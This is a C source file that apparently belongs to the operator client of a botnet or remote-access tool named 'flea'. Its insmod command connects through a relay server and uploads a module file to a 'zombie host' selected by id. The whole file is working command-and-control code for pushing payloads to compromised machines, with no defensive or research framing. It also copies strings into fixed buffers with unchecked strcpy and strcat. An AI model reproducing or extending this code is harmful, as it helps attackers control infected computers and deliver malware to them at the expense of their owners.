#include "config.h"
#include "modset.h"
#include "tunnel.h"
#include "protocol/dispatcher.h"
#include <ax/option.h>
#include <stdio.h>
#include <errno.h>
#include <inttypes.h>

int server_insmod(ax_socket sock, uint32_t token, const char *name, const char *file, int *err)
{
	FILE *fp = NULL;
	uint8_t id = MSG_SVR_INSMOD;
	if (ax_socket_syncsend(sock, &id, sizeof id))
		goto fail;


	fp = fopen(file, "rb+");
	if (!fp)
		goto fail;

	if (fseek(fp, 0, SEEK_END)) {
		goto fail;
	}
	size_t file_size = ftell(fp);

	fseek(fp, 0, SEEK_SET);

	struct msg_insmod insmod;
	strcpy(insmod.name, name);
	insmod.size = file_size;

	if (ax_socket_syncsend(sock, &insmod, sizeof insmod))
		goto fail;

	ssize_t len;
	char buffer[1024];
	while((len = fread(buffer, 1, sizeof buffer, fp)) != 0) {
		if (ax_socket_syncsend(sock, buffer, len))
			goto fail;
	}
	if (ferror(fp))
		goto fail;

	if (ax_socket_syncrecv(sock, &id, sizeof id)) {
		goto fail;
	}

	if (id != MSG_SVR_INSMOD)
		goto fail;
	
	struct msg_ret_code ret;

	if (ax_socket_syncrecv(sock, &ret, sizeof ret)) {
		ax_perror("error: %s", strerror(errno));
		goto fail;
	}
	*err = ret.error_code;
	fclose(fp);
	return 0;
fail:
	if (fp)
		fclose(fp);
	return -1;
}


void usage_insmod()
{
	fputs("Usage: flea insmod OPTIONS... FILE\n\n"
	      "Options:\n"
	      "    Install module FILE to specified zombie host.\n\n"
	      "    -r <address>    specifies relay server address\n"
	      "    -p <keyword>    specifies relay keyword\n"
	      "    -s <server id>  specifies zombie host\n"
	      "    -h              display this help\n"
	, stderr);
}

int cmd_insmod(int argc, char **argv)
{
	struct ax_option_st options;
	ax_option_init(&options, argv);
	const char *relay_addr = NULL, *keyword = NULL, *server = NULL, *mod_name = NULL;
	for (int op; (op = ax_option_parse(&options, "r:p:s:h")) != -1;) {
		switch (op) {
			case 'r':
				relay_addr = options.optarg;
				break;
			case 'p':
				keyword = options.optarg;
				break;
			case 's':
				server = options.optarg;
				break;
			case 'h':
				usage_insmod();
				return 0;
			default:
				fprintf(stderr, "Unsupported option -%c\n", options.optopt);
				usage_insmod();
				return 1;
		}
	}

	if (argc - options.optind == 0) {
		ax_perror("no mod is specified");
		usage_insmod();
		return 1;
	}
	mod_name = argv[options.optind];

	struct mod *mod = modset_find(mod_name);
	if (!mod) {
		ax_perror("Module %s is not found", mod_name);
		return -1;
	}

	if (!relay_addr) {
		ax_perror("Option -r expected");
		return 1;
	}

	if (!server) {
		ax_perror("Option -s expected");
		return 1;
	}

	if (!keyword) {
		fprintf(stderr, "Option -p expected");
		return 1;
	}

	uint32_t token_id;
	if (sscanf(server, "%" PRIu32, &token_id) != 1 || token_id == 0) {
		ax_perror("Invalid host id %s", argv[options.optind]);
		return 1;
	}

	ax_socket relay = tunnel_open(keyword, relay_addr, CONFIG_CLIENT_PORT, token_id, 0);
	if (relay == AX_SOCKET_INVALID) {
		ax_perror("Failed to connect to relay service");
		return 1;
	}


	
	
	int err;
	char path_buf[PATH_MAX];
	strcpy(path_buf, modset_dir());
	strcat(path_buf, "/");
	strcat(path_buf, mod->directory);
	strcat(path_buf, "/");
	strcat(path_buf, mod->server_mod);
	if (server_insmod(relay, token_id, mod->name, path_buf, &err)) {
		ax_perror("Remote error: %d", err);
		return 1;
	}
	if (err) {
		ax_perror("Install module %s failed, error %d", argv[options.optind], err);
	}

	ax_socket_close(relay);
	return 0;
}

